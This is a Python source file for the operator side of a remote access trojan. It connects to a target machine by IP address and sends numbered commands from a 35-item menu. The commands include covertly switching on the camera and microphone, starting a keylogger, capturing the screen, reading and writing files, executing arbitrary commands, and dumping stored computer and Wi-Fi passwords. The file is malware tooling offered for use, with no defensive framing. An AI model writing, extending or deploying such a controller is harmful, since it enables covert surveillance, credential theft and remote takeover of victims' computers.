import socket

def send_command(host, port, command, data=None):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        s.sendall(command.encode('utf-8'))
        if data:
            s.sendall(data.encode('utf-8'))
        data = s.recv(4096)  # Increase buffer size if needed
        print('Received:', data.decode('utf-8'))

def display_menu():
    print("""
    (1) Turn on camera
    (2) Turn off camera
    (3) Turn on mic
    (4) Turn off mic
    (5) Start keylogger
    (6) Stop keylogger
    (7) Show keylogger results
    (8) Capture screen
    (9) List files in directory
    (10) Read file
    (11) Write to file
    (12) List processes
    (13) Kill process by PID
    (14) Scan network for open ports
    (15) Execute command
    (16) Get system information
    (17) Get network interfaces
    (18) Get active connections
    (19) Get route table
    (20) Get DNS cache
    (21) Fetch computer passwords
    (22) Reboot computer
    (23) Freeze screen
    (24) Rick Roll
    (25) Record audio
    (26) Move mouse
    (27) Click mouse
    (28) Get Wi-Fi passwords
    (29) Get installed software
    (30) Get recent files
    (31) Get startup items
    (32) Get scheduled tasks
    (33) Get user accounts
    (34) Get system events
    (35) Fetch content from a URL
    Enter your choice (1)-(35):
    """)

if __name__ == "__main__":
    host = input("Enter the target machine's IP address: ")
    port = 12345
    while True:
        display_menu()
        command = input("Enter command: ")
        if command == '1':
            send_command(host, port, command)
        elif command == '2':
            send_command(host, port, command)
        elif command == '3':
            send_command(host, port, command)
        elif command == '4':
            send_command(host, port, command)
        elif command == '5':
            send_command(host, port, command)
        elif command == '6':
            send_command(host, port, command)
        elif command == '7':
            send_command(host, port, command)
        elif command == '8':
            send_command(host, port, command)
        elif command == '9':
            directory = input("Enter directory: ")
            send_command(host, port, command, directory)
        elif command == '10':
            path = input("Enter file path: ")
            send_command(host, port, command, path)
        elif command == '11':
            path = input("Enter file path: ")
            content = input("Enter content: ")
            send_command(host, port, command, f"{path}\n{content}")
        elif command == '12':
            send_command(host, port, command)
        elif command == '13':
            pid = input("Enter PID: ")
            send_command(host, port, command, pid)
        elif command == '14':
            ip_range = input("Enter IP range (comma-separated): ")
            send_command(host, port, command, ip_range)
        elif command == '15':
            cmd = input("Enter command: ")
            send_command(host, port, command, cmd)
        elif command == '16':
            send_command(host, port, command)
        elif command == '17':
            send_command(host, port, command)
        elif command == '18':
            send_command(host, port, command)
        elif command == '19':
            send_command(host, port, command)
        elif command == '20':
            send_command(host, port, command)
        elif command == '21':
            send_command(host, port, command)
        elif command == '22':
            send_command(host, port, command)
        elif command == '23':
            send_command(host, port, command)
        elif command == '24':
            send_command(host, port, command)
        elif command == '25':
            duration = input("Enter duration (seconds): ")
            send_command(host, port, command, duration)
        elif command == '26':
            x = input("Enter X coordinate: ")
            y = input("Enter Y coordinate: ")
            send_command(host, port, command, f"{x}\n{y}")
        elif command == '27':
            send_command(host, port, command)
        elif command == '28':
            send_command(host, port, command)
        elif command == '29':
            send_command(host, port, command)
        elif command == '30':
            send_command(host, port, command)
        elif command == '31':
            send_command(host, port, command)
        elif command == '32':
            send_command(host, port, command)
        elif command == '33':
            send_command(host, port, command)
        elif command == '34':
            send_command(host, port, command)
        elif command == '35':
            url = input("Enter URL: ")
            send_command(host, port, command, url)
        else:
            print("Invalid command. Please enter a number between 1 and 35.")
